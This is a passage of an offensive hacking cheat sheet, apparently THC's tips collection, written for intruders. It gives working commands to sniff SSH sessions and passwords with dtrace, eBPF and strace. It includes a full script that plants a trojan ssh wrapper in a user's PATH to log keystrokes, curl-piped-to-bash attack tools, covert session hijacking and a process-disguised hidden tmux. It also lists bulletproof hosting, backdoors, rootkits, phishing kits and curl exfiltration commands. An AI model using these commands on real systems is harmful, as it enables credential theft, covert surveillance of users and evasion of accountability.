</span><span id="__span-184-5"><a id="__codelineno-184-5" name="__codelineno-184-5" href="#__codelineno-184-5"></a><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">stringof</span><span class="p">(</span><span class="n">copyin</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span><span class="w"> </span><span class="n">arg2</span><span class="p">)));</span><span class="w"> </span><span class="p">}</span>
</span></code></pre></div></p>
<p>Start a dtrace and log to /tmp/.log:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-185-1"><a id="__codelineno-185-1" name="__codelineno-185-1" href="#__codelineno-185-1"></a><span class="c1">### Start kernel probe as background process.</span>
</span><span id="__span-185-2"><a id="__codelineno-185-2" name="__codelineno-185-2" href="#__codelineno-185-2"></a><span class="o">(</span>dtrace<span class="w"> </span>-sd<span class="w"> </span>&gt;/tmp/.log<span class="w"> </span><span class="p">&amp;</span><span class="o">)</span>
</span></code></pre></div></p>
<p><a id="bpf"></a>
<strong>10.iii Sniff all SHELL sessions with eBPF - Linux</strong></p>
<p>eBPF allows us to <em>safely</em> hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  </p>
<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-186-1"><a id="__codelineno-186-1" name="__codelineno-186-1" href="#__codelineno-186-1"></a>curl<span class="w"> </span>-o<span class="w"> </span>bpftrace<span class="w"> </span>-fsSL<span class="w"> </span>https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
</span><span id="__span-186-2"><a id="__codelineno-186-2" name="__codelineno-186-2" href="#__codelineno-186-2"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>bpftrace
</span><span id="__span-186-3"><a id="__codelineno-186-3" name="__codelineno-186-3" href="#__codelineno-186-3"></a>curl<span class="w"> </span>-o<span class="w"> </span>ptysnoop.bt<span class="w"> </span>-fsSL<span class="w"> </span>https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
</span><span id="__span-186-4"><a id="__codelineno-186-4" name="__codelineno-186-4" href="#__codelineno-186-4"></a>./bpftrace<span class="w"> </span>-Bnone<span class="w"> </span>ptysnoop.bt
</span></code></pre></div>
Check out our very own <a href="https://github.com/hackerschoice/bpfhacks">eBPF tools to sniff sudo/su/ssh passwords</a>.</p>
<p><a id="ssh-sniffing-strace"></a>
<strong>10.iv Sniff a user's outgoing SSH session with strace</strong>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-187-1"><a id="__codelineno-187-1" name="__codelineno-187-1" href="#__codelineno-187-1"></a>strace<span class="w"> </span>-e<span class="w"> </span><span class="nv">trace</span><span class="o">=</span><span class="nb">read</span><span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>x<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$x</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;^read.*= [1-9]$&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f2<span class="w"> </span>-d<span class="se">\&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span></code></pre></div>
Dirty way to monitor a user who is using <em>ssh</em> to connect to another host from a computer that you control.</p>
<p><a id="ssh-sniffing-wrapper"></a>
<strong>10.v. Sniff a user's outgoing SSH session with a wrapper script</strong></p>
<p>Even dirtier method in case <em>/proc/sys/kernel/yama/ptrace_scope</em> is set to 1 (strace will fail on already running SSH sessions)</p>
<p>Create a wrapper script called 'ssh' that executes strace + ssh to log the session:</p>
<details>
  <summary>Show wrapper script - CLICK HERE</summary>

<div class="language-sh highlight"><pre><span></span><code><span id="__span-188-1"><a id="__codelineno-188-1" name="__codelineno-188-1" href="#__codelineno-188-1"></a><span class="c1"># Cut &amp; Paste the following into a bash shell:</span>
</span><span id="__span-188-2"><a id="__codelineno-188-2" name="__codelineno-188-2" href="#__codelineno-188-2"></a><span class="c1"># Add a local path to the PATH variable so our &#39;ssh&#39; is executed instead of the real ssh:</span>
</span><span id="__span-188-3"><a id="__codelineno-188-3" name="__codelineno-188-3" href="#__codelineno-188-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;PATH=~/.local/bin:$PATH #0xFD0E&#39;</span><span class="w"> </span>&gt;&gt;~/.profile
</span><span id="__span-188-4"><a id="__codelineno-188-4" name="__codelineno-188-4" href="#__codelineno-188-4"></a>
</span><span id="__span-188-5"><a id="__codelineno-188-5" name="__codelineno-188-5" href="#__codelineno-188-5"></a><span class="c1"># Create a log directory and our own ssh binary</span>
</span><span id="__span-188-6"><a id="__codelineno-188-6" name="__codelineno-188-6" href="#__codelineno-188-6"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/.local/bin<span class="w"> </span>~/.local/logs
</span><span id="__span-188-7"><a id="__codelineno-188-7" name="__codelineno-188-7" href="#__codelineno-188-7"></a>
</span><span id="__span-188-8"><a id="__codelineno-188-8" name="__codelineno-188-8" href="#__codelineno-188-8"></a>cat<span class="w"> </span><span class="s">&lt;&lt;__EOF__ &gt;~/.local/bin/ssh</span>
</span><span id="__span-188-9"><a id="__codelineno-188-9" name="__codelineno-188-9" href="#__codelineno-188-9"></a><span class="s">#! /bin/bash</span>
</span><span id="__span-188-10"><a id="__codelineno-188-10" name="__codelineno-188-10" href="#__codelineno-188-10"></a><span class="s">strace -e trace=read -I 1 -o &#39;! ~/.local/bin/ssh-log \$\$&#39; /usr/bin/ssh \$@</span>
</span><span id="__span-188-11"><a id="__codelineno-188-11" name="__codelineno-188-11" href="#__codelineno-188-11"></a><span class="s">__EOF__</span>
</span><span id="__span-188-12"><a id="__codelineno-188-12" name="__codelineno-188-12" href="#__codelineno-188-12"></a>
</span><span id="__span-188-13"><a id="__codelineno-188-13" name="__codelineno-188-13" href="#__codelineno-188-13"></a>cat<span class="w"> </span><span class="s">&lt;&lt;__EOF__ &gt;~/.local/bin/ssh-log</span>
</span><span id="__span-188-14"><a id="__codelineno-188-14" name="__codelineno-188-14" href="#__codelineno-188-14"></a><span class="s">#! /bin/bash</span>
</span><span id="__span-188-15"><a id="__codelineno-188-15" name="__codelineno-188-15" href="#__codelineno-188-15"></a><span class="s">grep -F &#39;read(4&#39; | cut -f2 -d\\&quot; | while read -r x; do</span>
</span><span id="__span-188-16"><a id="__codelineno-188-16" name="__codelineno-188-16" href="#__codelineno-188-16"></a><span class="s">        [[ \${#x} -gt 5 ]] &amp;&amp; continue </span>
</span><span id="__span-188-17"><a id="__codelineno-188-17" name="__codelineno-188-17" href="#__codelineno-188-17"></a><span class="s">        [[ \${x} == +(\\\\n|\\\\r) ]] &amp;&amp; { echo &quot;&quot;; continue; }</span>
</span><span id="__span-188-18"><a id="__codelineno-188-18" name="__codelineno-188-18" href="#__codelineno-188-18"></a><span class="s">        echo -n &quot;\${x}&quot;</span>
</span><span id="__span-188-19"><a id="__codelineno-188-19" name="__codelineno-188-19" href="#__codelineno-188-19"></a><span class="s">done &gt;\$HOME/.local/logs/ssh-log-&quot;\${1}&quot;-\`date +%s\`.txt</span>
</span><span id="__span-188-20"><a id="__codelineno-188-20" name="__codelineno-188-20" href="#__codelineno-188-20"></a><span class="s">__EOF__</span>
</span><span id="__span-188-21"><a id="__codelineno-188-21" name="__codelineno-188-21" href="#__codelineno-188-21"></a>
</span><span id="__span-188-22"><a id="__codelineno-188-22" name="__codelineno-188-22" href="#__codelineno-188-22"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>~/.local/bin/ssh<span class="w"> </span>~/.local/bin/ssh-log
</span><span id="__span-188-23"><a id="__codelineno-188-23" name="__codelineno-188-23" href="#__codelineno-188-23"></a>.<span class="w"> </span>~/.profile
</span><span id="__span-188-24"><a id="__codelineno-188-24" name="__codelineno-188-24" href="#__codelineno-188-24"></a>
</span><span id="__span-188-25"><a id="__codelineno-188-25" name="__codelineno-188-25" href="#__codelineno-188-25"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\033[1;32m***SUCCESS***.</span>
</span><span id="__span-188-26"><a id="__codelineno-188-26" name="__codelineno-188-26" href="#__codelineno-188-26"></a><span class="s2">Logfiles stored in ~/.local/.logs/.</span>
</span><span id="__span-188-27"><a id="__codelineno-188-27" name="__codelineno-188-27" href="#__codelineno-188-27"></a><span class="s2">To uninstall cut &amp; paste this\033[0m:\033[1;36m</span>
</span><span id="__span-188-28"><a id="__codelineno-188-28" name="__codelineno-188-28" href="#__codelineno-188-28"></a><span class="s2">  grep -v 0xFD0E ~/.profile &gt;~/.profile-new &amp;&amp; mv ~/.profile-new ~/.profile</span>
</span><span id="__span-188-29"><a id="__codelineno-188-29" name="__codelineno-188-29" href="#__codelineno-188-29"></a><span class="s2">  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt</span>
</span><span id="__span-188-30"><a id="__codelineno-188-30" name="__codelineno-188-30" href="#__codelineno-188-30"></a><span class="s2">  rmdir ~/.local/bin ~/.local/logs ~/.local &amp;&gt;/dev/null \033[0m&quot;</span>
</span></code></pre></div>
(thanks to Gerald for testing this)
</details>

<p>The SSH session will be sniffed and logged to <em>~/.ssh/logs/</em> the next time the user logs into his shell and uses SSH.</p>
<p><a id="ssh-sniffing-sshit"></a>
<strong>10.vi Sniff a user's outgoing SSH session using SSH-IT</strong></p>
<p>The easiest way is using <a href="https://www.thc.org/ssh-it/">https://www.thc.org/ssh-it/</a>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-189-1"><a id="__codelineno-189-1" name="__codelineno-189-1" href="#__codelineno-189-1"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://thc.org/ssh-it/x<span class="k">)</span><span class="s2">&quot;</span>
</span></code></pre></div>
<p><a id="hijack"></a>
<strong>10.vii Hijack / Take-over a running SSH session</strong>  </p>
<p>Use <a href="https://github.com/nelhage/reptyr">https://github.com/nelhage/reptyr</a> to take over an existing SSH session:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-190-1"><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a>ps<span class="w"> </span>ax<span class="w"> </span>-o<span class="w"> </span>pid,ppid,cmd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;ssh &#39;</span>
</span><span id="__span-190-2"><a id="__codelineno-190-2" name="__codelineno-190-2" href="#__codelineno-190-2"></a>./reptyr<span class="w"> </span>-T<span class="w"> </span>&lt;SSH<span class="w"> </span>PID&gt;
</span><span id="__span-190-3"><a id="__codelineno-190-3" name="__codelineno-190-3" href="#__codelineno-190-3"></a><span class="c1">### or: ./reptyr -T $(pidof -s ssh)</span>
</span><span id="__span-190-4"><a id="__codelineno-190-4" name="__codelineno-190-4" href="#__codelineno-190-4"></a><span class="c1">### Must use &#39;-T&#39; or otherwise the original user will see that his SSH process gets suspended.</span>
</span></code></pre></div></p>
<hr />
<p><a id="vpn-shell"></a></p>
<h2 id="11-vpn-shells">11. VPN &amp; Shells</h2>
<p><a id="shell"></a>
<strong>11.i. Disposable Root Servers</strong></p>
<div class="language-console highlight"><pre><span></span><code><span id="__span-191-1"><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a><span class="gp">$ </span>ssh<span class="w"> </span>root@segfault.net<span class="w"> </span><span class="c1"># Use password &#39;segfault&#39;</span>
</span></code></pre></div>
<p>https://thc.org/segfault</p>
<p><a id="vpn"></a>
<strong>11.ii. VPN/VPS/Proxies</strong></p>
<p>Trusted VPN Providers
1. https://www.mullvad.net
1. https://www.cryptostorm.is
1. https://proton.me - Offers FREE VPN
1. https://vpn.fail - Run by volunteers</p>
<p>Virtual Private Servers
1. https://www.hetzner.com - Cheap
2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
1. https://dmzhost.co - Ignore most abuse requests
2. https://alexhost.com - No KYC. Bullet Proof. DMCA free zone
3. https://basehost.eu - Ignores court orders
4. https://buyvm.net - Warez best friend
5. https://serverius.net - Used by gangsters
6. https://1984.hosting - Privacy
7. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
8. https://www.privatelayer.com - Swiss based.</p>
<p>See <a href="https://kycnot.me/">other KYC Free Services</a> (<a href="http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/">.onion</a>)</p>
<p>Proxies (we dont use any of those)
1. <a href="https://github.com/mahdibland/V2RayAggregator">V2Ray Proxies</a>
2. <a href="https://github.com/snawoot/hola-proxy">Hola Proxies</a>
3. <a href="https://github.com/Zaeem20/FREE_PROXIES_LIST">Zaeem's Free Proxy List</a>
4. <a href="https://github.com/bluet/proxybroker2">Proxy Broker 2</a>
5. <a href="https://api.proxyscrape.com/v2/?request=displayproxies&amp;protocol=all&amp;timeout=750&amp;country=all">proxyscrape.com</a>
6. <a href="https://www.my-proxy.com">my-proxy.com</a>
7. <a href="https://getfreeproxylists.blogspot.com/">getfreeproxylists.blogspot.com</a>
8. <a href="https://proxypedia.org/">proxypedia.org</a>
9. <a href="https://socks-proxy.net/">socks-proxy.net</a>
10. <a href="https://www.thc.org/segfault">Segfault</a>: <code>curl -x socks5h://$(PROXY) ipinfo.io</code> - selects a random proxy for every request</p>
<p>Many other services (for free)<br />
1. https://free-for.dev/</p>
<hr />
<p><a id="osint"></a></p>
<h2 id="12-intelligence-gathering">12. Intelligence Gathering</h2>
<table>
<thead>
<tr>
<th>OSINT Hacker Tools</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>https://osint.sh</td>
<td>Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more</td>
</tr>
<tr>
<td>https://cli.fyi</td>
<td>Free. curl/json interface to many services. Try <code>curl cli.fyi/me</code> or <code>curl cli.fyi/thc.org</code>.</td>
</tr>
<tr>
<td>https://check-your-website.server-daten.de</td>
<td>Free. TLS/DNS/Security check a domain.</td>
</tr>
<tr>
<td>https://hackertarget.com/ip-tools/</td>
<td>Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support)</td>
</tr>
<tr>
<td>https://account.shodan.io/billing/tour</td>
<td>Open Port DB &amp; DNS Lookup from around the world</td>
</tr>
<tr>
<td>https://dnsdumpster.com/</td>
<td>Domain Recon Tool</td>
</tr>
<tr>
<td>https://crt.sh/</td>
<td>TLS Certificate Search</td>
</tr>
<tr>
<td>https://archive.org/web/</td>
<td>Historical view of websites</td>
</tr>
<tr>
<td>https://www.farsightsecurity.com/solutions/dnsdb/</td>
<td>DNS search (not free)</td>
</tr>
<tr>
<td>https://wigle.net/</td>
<td>Wireless Network Mapper</td>
</tr>
<tr>
<td>https://radiocells.org/</td>
<td>Cell Tower Informations</td>
</tr>
<tr>
<td>https://www.shodan.io/</td>
<td>Search Engine to find devices &amp; Banners (not free)</td>
</tr>
<tr>
<td>https://spur.us/context/me</td>
<td>IP rating <code>https://spur.us/context/&lt;IP&gt;</code></td>
</tr>
<tr>
<td>http://drs.whoisxmlapi.com</td>
<td>Reverse Whois Lookup (not free)</td>
</tr>
<tr>
<td>https://www.abuseipdb.com</td>
<td>IP abuse rating</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>OSINT for Detectives</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list</td>
<td>Nixintel's OSINT Resource List</td>
</tr>
<tr>
<td>https://github.com/jivoi/awesome-osint</td>
<td>Awesome OSINT list</td>
</tr>
<tr>
<td>https://cipher387.github.io/osint_stuff_tool_collection/</td>
<td>OSINT tools collection</td>
</tr>
<tr>
<td>https://osintframework.com/</td>
<td>Many OSINT tools</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>OSINT Databases</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>https://data.ddosecrets.com/</td>
<td>Database Dumps</td>
</tr>
</tbody>
</table>
<hr />
<p><a id="misc"></a></p>
<h2 id="13-miscellaneous">13. Miscellaneous</h2>
<p><a id="tools"></a>
<strong>13.i. Tools of the trade</strong></p>
<p>Comms
1. <a href="https://www.cs.email/">CryptoStorm Email</a> - Disposable emails (send &amp; receive). (List of <a href="https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services]">Disposable-email-services</a>).
1. <a href="https://temp-mail.org/en/">Temp-Mail</a> - Disposable email service with great Web GUI. Receive only.
2. <a href="https://tuta.io">tuta.io</a> or <a href="https://pm.me">ProtonMail</a>/<a href="https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion/">.onion</a> - Free &amp; Private email
1. <a href="https://quackr.io/">Quackr.Io</a> - Disposable SMS/text messages (List of <a href="https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services">Disposable-SMS-services</a>).
1. <a href="https://crypton.sh/">Crypton</a> - Rent a private SIM/SMS with crypto (<a href="http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/">.onion</a>)
2. <a href="https://kycnot.me/">List of "No KYC" Services</a> (<a href="http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/">.onion</a>)</p>
<p>OpSec
1. <a href="https://medium.com/@hackerschoice/it-security-and-privacy-for-the-rebellions-of-the-world-db4023cadcca">OpSec for Rebellions</a> - Start Here. The simplest 3 steps.
1. <a href="https://riseup.net/">RiseUp</a> - Mail, VPN and Tips for (online) rebellions.
1. <a href="https://github.com/m1k1o/neko">Neko</a> - Launch Firefox in Docker and access via 127.0.0.1:8080 (WebRTC)
2. <a href="https://github.com/mviereck/x11docker">x11Docker</a> - Isolate any X11 app in a container (Linux &amp; Windows only). (<a href="https://techviewleo.com/run-gui-applications-in-docker-using-x11docker/?expand_article=1">Article</a>)
3. <a href="https://github.com/freedomofpress/dangerzone">DangerZone</a> - Make PDFs safe before opening them.
4. <a href="https://exiftool.org/">ExifTool</a> - Remove meta data from files (<code>exiftool -all= example.pdf example1.jpg ...</code>)
5. <a href="https://www.eff.org/">EFF</a> - Clever advise for freedom figthers.</p>
<p>Exploits
1. <a href="https://github.com/xaitax/SploitScan">SploitScan</a> - Exploit Score &amp; PoC search (by xaitax)
1. <a href="https://github.com/liamg/traitor">Traitor</a> - Tries various exploits/vulnerabilities to gain root (LPE)
1. <a href="https://packetstormsecurity.com">PacketStorm</a> - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
1. <a href="https://www.exploit-db.com">ExploitDB</a> - Also includes metasploit db and google hacking db
1. <a href="https://exploits.shodan.io/welcome">Shodan/Exploits</a> - Similar to exploit-db</p>
<p>System Information Gathering
1. <code>curl -fsSL https://thc.org/ws | bash</code> - Show all domains hosted on a server + system-information
1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type <code>getexploit</code> after install)
1. https://github.com/efchatz/pandora - Windows: dump password from various password managers</p>
<p>Backdoors
1. https://www.gsocket.io/deploy - The world's smallest backdoor
1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
1. https://www.kali.org/tools/weevely - PHP backdoor</p>
<p>Network Scanners
1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
1. https://github.com/ptrrkssn/pnscan - Fast network scanner
1. https://zmap.io/ - ZMap &amp; ZGrab</p>
<p>Vulnerability Scanners
1. <a href="https://github.com/evyatarmeged/Raccoon">Raccoon</a> - Reconnaissance and Information Gathering
1. <a href="https://github.com/j3ssie/osmedeus">Osmedeus</a> - Vulnerability and Information gathering
1. <a href="https://github.com/fullhunt/">FullHunt</a> - log4j and spring4shell scanner </p>
<p>DDoS
1. <a href="https://github.com/the-deepnet/ddos">DeepNet</a> - we despise DDoS but if we had to then this would be our choice.</p>
<p>Static Binaries / pre-compiled Tools
1. https://github.com/Azathothas/Toolpacks/tree/main from <a href="https://github.com/metis-os/hysp-pkgs">hysp project</a>
1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
1. https://iq.thc.org/cross-compiling-exploits</p>
<p>Phishing
1. https://github.com/htr-tech/zphisher - We don't hack like this but this is what we would use.
2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah</p>
<p>Tools
1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
1. https://tmate.io/ - Share A screen with others</p>
<p>Callback / Canary / Command &amp; Control
1. http://dnslog.cn
1. https://app.interactsh.com
1. https://api.telegram.org
1. https://webhook.site</p>
<p>Tunneling
1. <a href="https://github.com/ginuerzh/gost/blob/master/README_en.md">Gost</a>
1. <a href="https://tgcd.sourceforge.net/">TCP Gender Changer</a> for all your 'connect back' needs.
1. <a href="https://ngrok.com/download">ngrok</a>, <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-apps">cloudflared</a> or <a href="https://pagekite.net/">pagekite</a> to make a server behind NAT accessible from the public Internet.</p>
<p>Exfil<a id="cloudexfil"></a>
1. <a href="https://github.com/hackerschoice/gsocket#blitz">Blitz</a> - <code>blitz -l</code> / <code>blitz foo.txt</code>
2. <a href="https://github.com/cyberbutler/RedDrop">RedDrop</a> - run your own Exfil Server
1. <a href="https://mega.io/cmd">Mega</a>
2. <a href="https://oshi.at/">oshiAt</a> - also on TOR. <code>curl -T foo.txt https://oshi.at</code>
5. <a href="https://transfer.sh/">Transfer.sh</a> - <code>curl -T foo.txt https://transfer.sh</code>
6. <a href="https://litterbox.catbox.moe/tools.php">LitterBox</a> - <code>curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php</code><br />
7. <a href="https://github.com/schollz/croc">Croc</a> - <code>croc send foo.txt / croc anit-price-example</code>
8. <a href="https://pypi.org/project/magic-wormhole/">MagicWormhole</a></p>
<p>Publishing
1. <a href="https://valdikss.org.ru/schare/">free BT/DC/eD2k seedbox</a>
1. Or use /onion on <a href="https://www.thc.org/segfault">segfault.net</a> or plain old https with ngrok.
1. <a href="https://www.duckdns.org/">DuckDNS</a> - Free Dynamic Domain Names
3. <a href="https://www.afraid.org">afraid.org</a> - Free Dynamic DNS for your domain
2. <a href="https://dns.he.net/">he.net</a> - Free Nameserver service
4. <a href="https://0bin.net/">0bin</a> / <a href="https://paste.ec">paste.ec</a> - Encrypted PasteBin
5. <a href="https://pad.riseup.net">pad.riseup.net</a> - Create documents and share them securely</p>
<p>Forums and Conferences
1. <a href="https://0x00sec.org/">0x00Sec</a> - Reverse Engineering &amp; Hacking with a pinch of Malware
3. <a href="https://www.alligatorcon.eu/">AlligatorCon</a> - the original
4. <a href="https://0x41con.org/">0x41con</a>
5. <a href="https://tumpicon.org/">TumpiCon</a></p>
<p>Telegram Channels<a id="channels"></a>
1. <a href="https://t.me/thcorg">The Hacker's Choice</a>
1. <a href="https://t.me/thehackernews">The Hacker News</a>
1. <a href="https://t.me/CyberSecurityTechnologies">CyberSecurity Technologies</a>
1. <a href="https://t.me/OffensiveTwitter">Offensive Twitter</a>
1. <a href="https://t.me/Pwn3rzs">Pwn3rzs</a>
1. <a href="https://t.me/vxunderground">VX-Underground</a>
1. <a href="https://t.me/cKure">cKure</a>
1. <a href="https://t.me/androidMalware">Android Security / Malware</a>
1. <a href="https://t.me/cybdetective">OSINT CyberDetective</a>
1. <a href="https://t.me/bookzillaaa">BookZillaaa</a></p>
<p>Mindmaps &amp; Knowledge
1. <a href="https://github.com/CompassSecurity/Hacking_Tools_Cheat_Sheet">Compass Sec Cheat Sheets</a>
2. <a href="https://github.com/wearecaster/NetworkNightmare/blob/main/NetworkNightmare_by_Caster.png">Network Pentesting</a>
1. <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg">Active Directory</a></p>
<p><a id="cool-linux-commands"></a>
<strong>13.ii. Cool Linux commands</strong></p>
<ol>
<li>https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/</li>
<li>https://github.com/ibraheemdev/modern-unix</li>
</ol>
<p><a id="tmux"></a>
<strong>13.iii. Tmux Cheat Sheet</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>Tmux Cheat Sheet</th>
</tr>
</thead>
<tbody>
<tr>
<td>Max Buffer</td>
<td><code>Ctrl-b</code> + <code>:</code> + <code>set-option -g history-limit 65535</code></td>
</tr>
<tr>
<td>SaveScrollback</td>
<td><code>Ctrl-b</code> + <code>:</code> + <code>capture-pane -S -</code> followed by <code>Ctrl-b</code> + <code>:</code> + <code>save-buffer filename.txt</code>.</td>
</tr>
<tr>
<td>SpyScrollback</td>
<td><code>tmux capture-pane -e -pS- -t 6.0</code> to capture pane 6, window 0 of a running tmux. Remove <code>-e</code> to save without colour.</td>
</tr>
<tr>
<td>Clear</td>
<td><code>tmux send-keys -R C-l \; clear-history -t6.0</code> to clear screen and delete scrollback history.</td>
</tr>
<tr>
<td>Logging</td>
<td><code>Ctrl-b</code> + <code>:</code> + <code>bind-key P pipe-pane -o "exec cat &gt;&gt;$HOME/'tmux-#W-#S.log'" \; display-message 'Toggling ~/tmux-#W-#S.log'</code><BR>Press <code>Ctrl-b</code> + <code>Shift + P</code> to start and stop.</td>
</tr>
<tr>
<td>HiddenTmux</td>
<td><code>cd /dev/shm &amp;&amp; zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache</code><BR>To attach to your session do <BR><code>cd /dev/shm &amp;&amp; zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache attach</code></td>
</tr>
<tr>
<td>Attach</td>
<td>Start a new tmux, then type <code>Ctrl-b</code> + <code>s</code> and use <code>LEFT</code>, <code>RIGHT</code> to preview and select any session.</td>
</tr>
<tr>
<td>Menu</td>
<td><code>Ctrl-b</code> + <code>&gt;</code>. Then use <code>Ctrl-b</code> + <code>UP</code>, <code>DOWN</code>, <code>LEFT</code> or <code>RIGHT</code> to move between the panes.</td>
</tr>
</tbody>
</table>
<p><a id="useful-commands"></a>
<strong>13.iv. Useful commands</strong></p>
<p>Use <code>lsof -Pni</code> or <code>netstat -putan</code> (or <code>ss -putan</code>) to list all Internet (<em>-tu</em>) connections.</p>
<p>Use <code>ss -lntp</code> to show all listening (<em>-l</em>) TCP (<em>-t</em>) sockets.</p>
<p>Use <code>netstat -rn</code> or <code>ip route show</code> to show default Internet route.</p>
<p>Use <code>curl cheat.sh/tar</code> to get TLDR help for tar. Works with any other linux command.</p>
<p>Use <code>curl -fsSL bench.sh | bash</code> to speed test a server.</p>
<p>Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. <em>rlwrap</em> comes to the rescue. It buffers all single keystrokes until <em>Enter</em> is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...</p>
<p>Example for the receiving end of a revese tunnel:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-192-1"><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a>rlwrap<span class="w"> </span>--always-readline<span class="w"> </span>nc<span class="w"> </span>-vnlp<span class="w"> </span><span class="m">1524</span>
</span></code></pre></div></p>
<p>Example for <em>SSH</em>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-193-1"><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a>rlwrap<span class="w"> </span>--always-readline<span class="w"> </span>ssh<span class="w"> </span>user@host
</span></code></pre></div></p>
<hr />
<p><a id="others"></a></p>
<h2 id="14-other-sites">14. Other Sites</h2>
<ol>
<li><a href="https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/">Phineas Fisher</a> - No nonsense. Direct. How we like it.</li>
<li><a href="https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0">Hacking HackingTeam - a HackBack</a> - Old but real talent at work.</li>
<li><a href="https://www.youtube.com/watch?v=5vRIisM0Op4">Guacamaya Hackback</a></li>
<li><a href="https://www.vx-underground.org/">Vx Underground</a></li>
<li><a href="https://0xdf.gitlab.io/2023/05/27/htb-absolute.html">HTB absolute</a> - Well written and explained attack.</li>
<li><a href="https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak">Conti Leak</a> - Windows hacking. Pragmatic.</li>
<li><a href="https://www.ired.team/">Red Team Notes</a></li>
<li><a href="https://github.com/r1cksec/cheatsheets">InfoSec CheatSheet</a></li>
<li><a href="https://book.hacktricks.xyz/welcome/readme">HackTricks</a></li>
<li><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">Awesome Red Teaming</a></li>
<li><a href="https://github.com/vulhub/vulhub">VulHub</a> - Test your exploits</li>
<li><a href="https://www.qubes-os.org/">Qubes-OS</a> - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)</li>
</ol>
<hr />
<p>Shoutz: ADM, subz/#9x, DrWho, spoty
Join us on <a href="https://t.me/thcorg">Telegram</a>.</p>
